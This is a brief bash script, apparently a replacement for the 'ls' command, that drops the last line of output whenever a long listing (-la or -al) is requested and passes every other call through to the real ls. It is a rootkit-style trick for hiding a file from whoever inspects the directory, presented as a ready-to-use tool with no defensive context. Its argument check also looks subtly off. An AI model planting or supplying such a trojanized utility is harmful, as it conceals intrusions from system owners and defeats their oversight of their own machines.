#!/bin/bash
# Hides last file when running ls with -la or -al
if [ "$2" == "-la" ] || [ "$2" == "-al" ]; then
    /usr/bin/ls -la | wc -l | { read num; ((num -= 1)); /usr/bin/ls -la --color=always | head -n $num;}
else
    /usr/bin/ls $*
fi